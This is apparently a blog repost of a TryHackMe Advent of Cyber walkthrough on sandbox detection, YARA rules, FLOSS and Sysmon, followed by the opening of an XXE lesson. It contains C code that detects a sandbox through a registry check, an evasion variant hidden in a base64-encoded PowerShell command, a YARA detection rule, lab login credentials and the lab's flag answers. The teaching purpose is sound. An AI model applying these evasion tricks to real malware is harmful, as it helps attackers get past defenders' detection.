<p>But before unleashing it to wreak havoc on SOC teams and ruin SOC-mas, there was one final step. He needed to test it <a href="in">in</a> a sandbox.</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Analyze malware behaviour using sandbox tools.</li>
  <li>Explore how to use YARA rules to detect malicious patterns.</li>
  <li>Learn about various malware evasion techniques.</li>
  <li>Implement an evasion technique to bypass YARA rule detection.</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728927615.png" alt="Connection card" /></p>

<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> Button below to start the virtual machine in split-screen view.</p>

<p>If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page. Alternatively, you can connect to the VM via Remote Desktop (RDP) using the credentials below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM credentials RDP" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
      <th>administrator</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>TryH@cKMe9#21</td>
    </tr>
    <tr>
      <td><strong>IP</strong></td>
      <td>MACHINE_IP</td>
    </tr>
  </tbody>
</table>

<p><em>He slipped his malware into a sandbox to see, \n What tricks it could play and what flaws there might be. \n For sandboxes, you see, are used by the wise, Defenders inspect, but attackers revise!</em></p>

<h2 id="detecting-sandboxes">Detecting Sandboxes</h2>

<p>A sandbox is an isolated environment where (malicious) code is executed without affecting anything outside the system. Often, multiple tools are installed to monitor, record, and analyze the code’s behaviour.</p>

<p>Mayor Malware knows that before his malware executes, it needs to check if it is running on a Sandbox environment. If it is, then it should not continue with its malicious activity.</p>

<p>To do so, he has settled on one technique, which checks if the directory <code class="language-plaintext highlighter-rouge">C:\Program Files</code> is present by querying the Registry path <code class="language-plaintext highlighter-rouge">HKLM\\Software\\Microsoft\\Windows\\CurrentVersion</code>. The value can be confirmed by visiting the Registry path within the Registry Editor, as shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5e8dd9a4a45e18443162feab-1730152060596.png" alt="Registry editor" /></p>

<p>To open the <code class="language-plaintext highlighter-rouge">Windows Registry Editor</code>, navigate to the <code class="language-plaintext highlighter-rouge">Start Menu</code> on the bottom, select <code class="language-plaintext highlighter-rouge">Run</code>, enter <code class="language-plaintext highlighter-rouge">regedit</code>, and press enter.</p>

<p>This directory is often absent on sandboxes or other virtualized environments, which could indicate that the malware is running in a sandbox.</p>

<p>Here’s what it looks like in the C Programming Language:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">void</span> <span class="nf">registryCheck</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">registryPath</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">HKLM</span><span class="se">\\</span><span class="s2">Software</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">CurrentVersion</span><span class="dl">"</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">valueName</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ProgramFilesDir</span><span class="dl">"</span><span class="p">;</span>

    <span class="c1">// Prepare the command string for reg.exe</span>
    <span class="nx">char</span> <span class="nx">command</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="nf">snprintf</span><span class="p">(</span><span class="nx">command</span><span class="p">,</span> <span class="nf">sizeof</span><span class="p">(</span><span class="nx">command</span><span class="p">),</span> <span class="dl">"</span><span class="s2">reg query </span><span class="se">\"</span><span class="s2">%s</span><span class="se">\"</span><span class="s2"> /v %s</span><span class="dl">"</span><span class="p">,</span> <span class="nx">registryPath</span><span class="p">,</span> <span class="nx">valueName</span><span class="p">);</span>
    <span class="c1">// Run the command</span>
    <span class="nx">int</span> <span class="nx">result</span> <span class="o">=</span> <span class="nf">system</span><span class="p">(</span><span class="nx">command</span><span class="p">);</span>
    <span class="c1">// Check for successful execution</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">printf</span><span class="p">(</span><span class="dl">"</span><span class="s2">Registry query executed successfully.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nf">fprintf</span><span class="p">(</span><span class="nx">stderr</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Failed to execute registry query.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">flag</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">[REDACTED]</span><span class="dl">"</span><span class="p">;</span>
    <span class="nf">registryCheck</span><span class="p">();</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div>

<p>\n Don’t worry—you don’t have to understand every detail of the code. All you need to know is that this function is designed to check the system’s registry for a specified directory path (ProgramFilesDir). This path’s presence or absence helps the malware determine whether it’s running in a typical or virtualized environment,like a sandbox.</p>

<h2 id="can-yara-do-it">Can YARA Do It?</h2>

<p>Mayor Malware knows that McSkidy is a big fan of YARA rules.</p>

<p>YARA is a tool used to identify and classify malware based on patterns in its code. By writing custom rules, analysts can define specific characteristics to look for—such as particular strings, file headers, or behaviours—and YARA will scan files or processes to find matches, making it invaluable for detecting malicious code.</p>

<p>Mayor Malware does not think such a simple tool can detect his malware. But just to be sure, he has to test it out himself.</p>

<p>To do this, he wrote a small script that executes a YARA detection rule every time a new event is added to the System monitor log. This particular YARA rule detects any command that tries to access the registry. \n</p>

<p>Let’s have a look at the rule:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">rule</span> <span class="nx">SANDBOXDETECTED</span>
<span class="p">{</span>
    <span class="nl">meta</span><span class="p">:</span>
        <span class="nx">description</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Detects the sandbox by querying the registry key for Program Path</span><span class="dl">"</span>
        <span class="nx">author</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">TryHackMe</span><span class="dl">"</span>
        <span class="nx">date</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">2024-10-08</span><span class="dl">"</span>
        <span class="nx">version</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">1.1</span><span class="dl">"</span>

    <span class="nx">strings</span><span class="p">:</span>

    <span class="nx">$cmd</span><span class="o">=</span> <span class="dl">"</span><span class="s2">Software</span><span class="se">\\</span><span class="s2">Microsoft</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">CurrentVersion</span><span class="se">\"</span><span class="s2"> /v ProgramFilesDir</span><span class="dl">"</span> <span class="nx">nocase</span>



    <span class="nx">condition</span><span class="p">:</span>
        <span class="nx">$cmd</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Let’s understand the contents:</p>

<ul>
  <li>In the <strong>strings</strong> section, we have defined variables that include the value to look out for: $cmd</li>
  <li>In the <strong>condition</strong> section, we define when the rule will match the scanned file. In this case, if any of the specified strings are present.</li>
</ul>

<p>For his testing, Mayor Malware has set up a one-function script that runs the Yara rule and logs a true positive in <code class="language-plaintext highlighter-rouge">C:\Tools\YaraMatches.txt</code>.</p>

<p>Open up a PowerShell window, navigate to the <code class="language-plaintext highlighter-rouge">C:\Tools</code> directory, and use the following command to start up the EDR:</p>

<p>Administrator: Windows PowerShell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="o">&gt;</span> <span class="p">.</span><span class="err">\</span><span class="nx">JingleBells</span><span class="p">.</span><span class="nx">ps1</span>
<span class="nx">No</span> <span class="nx">events</span> <span class="nx">found</span> <span class="k">in</span> <span class="nx">Sysmon</span> <span class="nx">log</span><span class="p">.</span>
<span class="nx">Monitoring</span> <span class="nx">Sysmon</span> <span class="nx">events</span><span class="p">...</span> <span class="nx">Press</span> <span class="nx">Ctrl</span><span class="o">+</span><span class="nx">C</span> <span class="nx">to</span> <span class="nx">exit</span><span class="p">.</span>

</code></pre></div></div>

<p>This tool will run on the system and continuously monitor the generated Event Logs. It will alert you if it finds any activity/event that indicates the registry mentioned above key is being queried.</p>

<p>Now run the malware by navigating to <code class="language-plaintext highlighter-rouge">C:\Tools\Malware</code>, and double-clicking on <code class="language-plaintext highlighter-rouge">MerryChristmas.exe</code>.</p>

<p>If our custom script did its job, you should have witnessed a popup by our EDR with a flag included, as shown below. This will be the answer to Question 1 below. You can now exit the custom EDR by pressing <code class="language-plaintext highlighter-rouge">Ctrl+C</code>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5e8dd9a4a45e18443162feab-1730154020793.png" alt="PowerShell taskbar item" /></p>

<p><strong><em>Note:</em></strong> <em>If the popup does not show up, hover over the PowerShell item in the taskbar. It should show the popup that was generated.</em></p>

<h2 id="adding-more-evasion-techniques">Adding More Evasion Techniques</h2>

<p>Ah, it seems that Yara can detect the evasion that Mayor Malware has added. No worries. Because we can make our malware even stealthier by introducing obfuscation.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">void</span> <span class="nf">registryCheck</span><span class="p">()</span> <span class="p">{</span>
<span class="c1">// Encoded PowerShell command to query the registry</span>
    <span class="kd">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">encodedCommand</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuACIAIAAtAE4AYQBtAGUAIABQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwBEAGkAcgA=</span><span class="dl">"</span><span class="p">;</span>
    <span class="c1">// Prepare the PowerShell execution command</span>
    <span class="nx">char</span> <span class="nx">command</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="nf">snprintf</span><span class="p">(</span><span class="nx">command</span><span class="p">,</span> <span class="nf">sizeof</span><span class="p">(</span><span class="nx">command</span><span class="p">),</span> <span class="dl">"</span><span class="s2">powershell -EncodedCommand %s</span><span class="dl">"</span><span class="p">,</span> <span class="nx">encodedCommand</span><span class="p">);</span>

    <span class="c1">// Run the command</span>
    <span class="nx">int</span> <span class="nx">result</span> <span class="o">=</span> <span class="nf">system</span><span class="p">(</span><span class="nx">command</span><span class="p">);</span>

    <span class="c1">// Check for successful execution</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">printf</span><span class="p">(</span><span class="dl">"</span><span class="s2">Registry query executed successfully.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nf">fprintf</span><span class="p">(</span><span class="nx">stderr</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Failed to execute registry query.</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><strong>Code Explanation</strong></p>

<p>The above code does the same thing: query the same registry key to get the information about the Program Data. The only difference is that the query is now encoded using base64, and the code uses the PowerShell to execute the query. The encoded string can be checked by decoding it using a tool like <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, as shown below: \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730911341730.png" alt="CyberChef GUI" /></p>

<h2 id="beware-of-floss">Beware of Floss</h2>

<p>While obfuscation is helpful, we also need to know that there are tools available that extract obfuscated strings from malware binaries. One such tool is Floss, a powerful tool developed by Mandiant that functions similarly to the Linux strings tool but is optimized for malware analysis, making it ideal for revealing any concealed details.</p>

<p>To try out Floss, open a PowerShell Window and enter the following command:</p>

<p>Administrator: Windows Powershell \n</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">FLOSS</span><span class="o">&gt;</span> <span class="nx">floss</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">Malware</span><span class="err">\</span><span class="nx">MerryChristmas</span><span class="p">.</span><span class="nx">exe</span> <span class="o">|</span><span class="nx">Out</span><span class="o">-</span><span class="nx">file</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">tools</span><span class="err">\</span><span class="nx">malstrings</span><span class="p">.</span><span class="nx">txt</span>

</code></pre></div></div>

<p>The above command can take up to two minutes to complete. In the meantime, let’s break down the command:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">floss.exe C:\Tools\Malware\MerryChristmas.exe</code>: This command scans for strings in the binary MerryChrismas.exe. If any hardcoded variables were defined in the malware, Floss should find them.</li>
  <li>The <code class="language-plaintext highlighter-rouge">|</code>symbol redirects the output of the command in front of it to the input of the command behind it. \n</li>
  <li><code class="language-plaintext highlighter-rouge">Out-file C:\tools\malstrings.txt</code>: We save the command results in a file called <code class="language-plaintext highlighter-rouge">malstrings.txt</code>.</li>
</ul>

<p>Once the command is done, open <code class="language-plaintext highlighter-rouge">malstrings.txt</code>, press <code class="language-plaintext highlighter-rouge">CTRL+F</code>, and search for the string Mayor Malware. Enter the flag as the answer to question two. The format of the string is <code class="language-plaintext highlighter-rouge">THM{}</code>.</p>

<h2 id="using-yara-rules-on-sysmon-logs">Using YARA Rules on Sysmon Logs</h2>

<p>These YARA rules are becoming a pain to Mayor Malware’s backside.</p>

<p>If he wants his malware to be undetectable, he needs to research how YARA rules can be used to stop him. For example, his research tells him that YARA rules can also be used to check Sysmon logs for any artefacts left by malware! He’ll need to test this as well.</p>

<p><strong>Sysmon</strong>, a tool from Microsoft’s Sysinternals suite, continuously monitors and logs system activity across reboots. This Windows service provides detailed event data on process creation, network connections, and file changes—valuable insights when tracing malware behaviour.</p>

<p>A YARA rule will look for events with <code class="language-plaintext highlighter-rouge">event id 1: Process created</code> for this to work. There are many entries in the Sysmon log. To make it easier to find the event we are looking for, we will apply a custom filter using the <code class="language-plaintext highlighter-rouge">EventRecordID</code> that we can see in the log <code class="language-plaintext highlighter-rouge">YaraMatches.txt</code> located in <code class="language-plaintext highlighter-rouge">C:\Tools</code>.</p>

<p>Open a PowerShell window and enter the following command to check the contents of the EDR log file:</p>

<p><code class="language-plaintext highlighter-rouge">get-content C:\Tools\YaraMatches.txt</code></p>

<p>You should get a result similar to the output below:</p>

<p>Administrator: Windows PowerShell</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="o">&gt;</span> <span class="kd">get</span><span class="o">-</span><span class="nx">content</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">YaraMatches</span><span class="p">.</span><span class="nx">txt</span>

<span class="nx">Event</span> <span class="nx">Time</span><span class="p">:</span> <span class="mi">10</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">15</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">39</span>
<span class="nx">Event</span> <span class="nx">ID</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">Event</span> <span class="nx">Record</span> <span class="nx">ID</span><span class="p">:</span> <span class="mi">96517</span>
<span class="nx">Command</span> <span class="nx">Line</span><span class="p">:</span> <span class="nx">reg</span>  <span class="nx">query</span> <span class="dl">"</span><span class="s2">HKLM</span><span class="se">\</span><span class="s2">Software</span><span class="se">\</span><span class="s2">Microsoft</span><span class="se">\</span><span class="s2">Windows</span><span class="se">\</span><span class="s2">CurrentVersion</span><span class="dl">"</span> <span class="o">/</span><span class="nx">v</span> <span class="nx">ProgramFilesDir</span>
<span class="nx">YARA</span> <span class="nx">Result</span><span class="p">:</span> <span class="nx">DetectShutdownTimeQuery</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="err">\</span><span class="nx">AppData</span><span class="err">\</span><span class="nx">Local</span><span class="err">\</span><span class="nx">Temp</span><span class="err">\</span><span class="mi">2</span><span class="err">\</span><span class="nx">tmp8D61</span><span class="p">.</span><span class="nx">tmp</span>

</code></pre></div></div>

<p>Note down the <code class="language-plaintext highlighter-rouge">Event Record ID value</code>. We will use this value to create a custom filter in the <code class="language-plaintext highlighter-rouge">Windows Event Viewer</code>.</p>

<p>Next, open the <code class="language-plaintext highlighter-rouge">Windows Event Viewer</code> by clicking on its logo in the taskbar and, on the left-hand side, navigate to <code class="language-plaintext highlighter-rouge">Applications and Services Logs -&gt; Microsoft -&gt; Windows -&gt; Sysmon -&gt; Operational</code>.</p>

<p>Continue by navigating to <code class="language-plaintext highlighter-rouge">Filter Current Log</code> on the right-hand side of the screen.</p>

<p>You should see a window like the one below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1731059911377.png" alt="filter current log windows" /></p>

<p>Navigate to XML and tick the checkbox <code class="language-plaintext highlighter-rouge">Edit query manually</code>. Click <code class="language-plaintext highlighter-rouge">Yes</code> to confirm. Finally, copy the following filter into the input box:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">QueryList</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="nx">Query</span> <span class="nx">Id</span><span class="o">=</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span> <span class="nx">Path</span><span class="o">=</span><span class="dl">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">Select</span> <span class="nx">Path</span><span class="o">=</span><span class="dl">"</span><span class="s2">Microsoft-Windows-Sysmon/Operational</span><span class="dl">"</span><span class="o">&gt;</span>
      <span class="o">*</span><span class="p">[</span><span class="nx">System</span><span class="p">[(</span><span class="nx">EventRecordID</span><span class="o">=</span><span class="dl">"</span><span class="s2">INSERT_EVENT_record_ID_HERE</span><span class="dl">"</span><span class="p">)]]</span>
    <span class="o">&lt;</span><span class="sr">/Select</span><span class="err">&gt;
</span>  <span class="o">&lt;</span><span class="sr">/Query</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/QueryList</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Replace the <code class="language-plaintext highlighter-rouge">EventRecordID</code> value with the one you recorded before. Apply the filter by clicking <code class="language-plaintext highlighter-rouge">OK</code>. Now you get the event related to the malware. Click on the event and then on the <code class="language-plaintext highlighter-rouge">Details</code> tab. You should get the following output:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730105846377.png" alt="Screenshot of details tab" /></p>

<p>Let’s take a look at the <code class="language-plaintext highlighter-rouge">EventData</code> that is valuable to us:</p>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">ParentImage</code> key shows us which parent process spawned the cmd.exe process to execute the registry check. We can see it was our malware located at <code class="language-plaintext highlighter-rouge">C:\Tools\Malware\MerryChristmas.exe</code>.</li>
  <li>The <code class="language-plaintext highlighter-rouge">ParentProcessId</code> and <code class="language-plaintext highlighter-rouge">ProcessId</code> keys are valuable for follow-up research. We could also use them to check other logs for related events.</li>
  <li>The <code class="language-plaintext highlighter-rouge">User</code> key can help us determine which privileges were used to run the <code class="language-plaintext highlighter-rouge">cmd.exe</code> command. The malware could have created a hidden account and used that to run commands.</li>
  <li>The <code class="language-plaintext highlighter-rouge">CommandLine</code> key shows which command was run in detail, helping us identify the malware’s actions.</li>
  <li>The <code class="language-plaintext highlighter-rouge">UtcTime</code> key is essential for creating a time frame for the malware’s operation. This time frame can help you focus your threat hunting efforts.</li>
</ul>

<h2 id="never-gonna-give-up">Never Gonna Give Up</h2>

<p><em>His malware, it seemed, wasn’t quite ready for town. \n “There are watchers and scanners and rules by the ton! \n If I’m not careful, they’ll catch all my fun!”</em></p>

<p>Mayor Malware leaned back, tapping his fingers thoughtfully on the table. All of this research had revealed an unsettling truth: his malware, as cunning as it was, wasn’t yet ready for the wild. There were too many tools and too many vigilant eyes—analysts armed with YARA rules, Sysmon, and a host of detection techniques that could expose his creation before it even had a chance to spread.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728611995.png" alt="Yeti playing in a sandbox" /> \n</p>

<p>He clenched his fist, a determined glint in his eye. <em>“Just a little more fine-tuning,”</em> he murmured. He would study, adapt, and evolve his malware until it was truly undetectable. When the time was right, he would unleash it upon the unsuspecting SOC teams, striking when they least expected it.</p>

<p>But for now, he would wait. Watching. Planning. And he was perfecting his craft in the shadows.</p>

<h2 id="answer-the-questions-below">Answer the questions below</h2>

<p>What is the flag displayed in the popup window after the EDR detects the malware?</p>

<p>THM{GlitchWasHere}</p>

<p>What is the flag found in the malstrings.txt document after running floss.exe, and opening the file in a text editor?</p>

<p>THM{HiddenClue}</p>

<p>If you want to more about sandboxes, have a look at the room <a href="https://tryhackme.com/r/room/flarevmarsenaloftools">FlareVM: Arsenal of Tools</a>.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[Mayor Malware was scheming, quite full of delight, To ruin SOC-mas and frighten SOC teams. But Glitch and McSkidy had spoiled his plan, By uncovering secrets that exposed the man!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day6-logo.png" /><media:content medium="image" url="http://localhost:4000/Day6-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 5</title><link href="http://localhost:4000/Day5" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 5" /><published>2024-12-05T00:00:00-05:00</published><updated>2024-12-05T00:00:00-05:00</updated><id>http://localhost:4000/Day5</id><content type="html" xml:base="http://localhost:4000/Day5"><![CDATA[<h1 id="advent-of-cyber-day-5">Advent of Cyber Day 5</h1>

<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730807266344.png" alt="Task banner for day 5." /></p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730283420107.png" alt="Software developing a new application." />The days in Wareville flew by, and Software’s projects were nearly complete, just in time for Christmas. One evening, after wrapping up work, Software was strolling through the town when he came across a young boy looking dejected. Curious, Software asked, “What would you like for Christmas?” The boy replied with a sigh, “I wish for a teddy bear, but I know that my family can’t afford one.”</p>

<p>This brief conversation sparked an idea in Software’s mind—what if there was a platform where everyone in town could share their Christmas wishes, and the Mayor’s office could help make them come true? Excited by the potential, Software introduced the idea to Mayor Malware, who embraced it immediately. The Mayor encouraged the team to build the platform for the people of Wareville.</p>

<p>Through the developers’ dedication and effort, the platform was soon ready and became an instant hit. The townspeople loved it! However, in their rush to meet the holiday deadline, the team had overlooked something critical—thorough security testing. Even Mayor Malware had chipped in to help develop a feature in the final hours. Now, it’s up to you to ensure the application is secure and free of vulnerabilities. Can you guarantee the platform runs safely for the people of Wareville?</p>

<p>Learning Objectives</p>

<ul>
  <li>Understand the basic concepts related to XML  <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730189972624.png" alt="XML handling data like a file drawer." /></li>
  <li>Explore XML External Entity (XXE) and its components</li>
  <li>Learn how to exploit the vulnerability</li>
  <li>Understand remediation measures</li>
</ul>

<p>Important Concepts</p>

<p><strong>Extensible Markup Language (XML)</strong></p>

<p>XML is a commonly used method to transport and store data in a structured format that humans and machines can easily understand. Consider a scenario where two computers need to communicate and share data. Both devices need to agree on a common format for exchanging information. This agreement (format) is known as <code class="language-plaintext highlighter-rouge">XML</code>. You can think of XML as a digital filing cabinet. Just as a filing cabinet has folders with labelled documents inside, XML uses <code class="language-plaintext highlighter-rouge">tags</code> to label and organise information. These tags are like folders that define the type of data stored. This is what an XML looks like, a simple piece of text information organised in a structured manner:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">people</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nx">name</span><span class="o">&gt;</span><span class="nx">Glitch</span><span class="o">&lt;</span><span class="sr">/name</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">address</span><span class="o">&gt;</span><span class="nx">Wareville</span><span class="o">&lt;</span><span class="sr">/address</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">email</span><span class="o">&gt;</span><span class="nx">glitch</span><span class="p">@</span><span class="nd">wareville</span><span class="p">.</span><span class="nx">com</span><span class="o">&lt;</span><span class="sr">/email</span><span class="err">&gt;
</span>   <span class="o">&lt;</span><span class="nx">phone</span><span class="o">&gt;</span><span class="mi">111000</span><span class="o">&lt;</span><span class="sr">/phone</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/people</span><span class="err">&gt;
</span></code></pre></div></div>

<p>In this case, the tags **<people>**, **<name>**, **&lt;address&gt;**, etc are like folders in a filing cabinet, but now they store data about Glitch. The content inside the tags, like "`Glitch`," "`Wareville`," and "`123-4567`" represents the actual data being stored. Like before, the key benefit of XML is that it is easily shareable and customisable, allowing you to create your own tags.</name></people></p>

<p><strong>Document Type Definition (DTD)</strong></p>

<p>Now that the two computers have agreed to share data in a common format, what about the structure of the format? Here is when the DTD comes into play. A DTD is a set of <strong>rules</strong> that defines the structure of an XML document. Just like a database scheme, it acts like a blueprint, telling you what elements (tags) and attributes are allowed in the XML file. Think of it as a guideline that ensures the XML document follows a specific structure.</p>

<p>For example, if we want to ensure that an XML document about <code class="language-plaintext highlighter-rouge">people</code> will always include a <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">address</code>, <code class="language-plaintext highlighter-rouge">email</code>, and <code class="language-plaintext highlighter-rouge">phone number</code>, we would define those rules through a DTD as shown below: \n</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">people</span> <span class="p">[</span>
   <span class="o">&lt;!</span><span class="nx">ELEMENT</span> <span class="nf">people</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">address</span><span class="p">,</span> <span class="nx">email</span><span class="p">,</span> <span class="nx">phone</span><span class="p">)</span><span class="o">&gt;</span>
   <span class="o">&lt;!</span><span class="nx">ELEMENT</span> <span class="nf">name </span><span class="p">(</span><span class="nx">#PCDATA</span><span class="p">)</span><span class="o">&gt;</span>
   <span class="o">&lt;!</span><span class="nx">ELEMENT</span> <span class="nf">address </span><span class="p">(</span><span class="nx">#PCDATA</span><span class="p">)</span><span class="o">&gt;</span>
   <span class="o">&lt;!</span><span class="nx">ELEMENT</span> <span class="nf">email </span><span class="p">(</span><span class="nx">#PCDATA</span><span class="p">)</span><span class="o">&gt;</span>
   <span class="o">&lt;!</span><span class="nx">ELEMENT</span> <span class="nf">phone </span><span class="p">(</span><span class="nx">#PCDATA</span><span class="p">)</span><span class="o">&gt;</span>
<span class="p">]</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>In the above DTD, <strong>&lt;!ELEMENT&gt;</strong>  defines the elements (tags) that are allowed, like name, address, email, and phone, whereas <code class="language-plaintext highlighter-rouge">#PCDATA</code> stands for parsed <code class="language-plaintext highlighter-rouge">people</code>data, meaning it will consist of just plain text. \n</p>

<p><strong>Entities</strong></p>

<p>So far, both computers have agreed on the format, the structure of data, and the type of data they will share. Entities in XML are placeholders that allow the insertion of large chunks of data or referencing internal or external files. They assist in making the XML file easy to manage, especially when the same data is repeated multiple times. Entities can be defined internally within the XML document or externally, referencing data from an outside source.</p>

<p>For example, an external entity references data from an external file or resource. In the following code, the entity <code class="language-plaintext highlighter-rouge">&amp;ext;</code> could refer to an external file located at “<code class="language-plaintext highlighter-rouge">http://tryhackme.com/robots.txt</code>”, which would be loaded into the XML, if allowed by the system:</p>

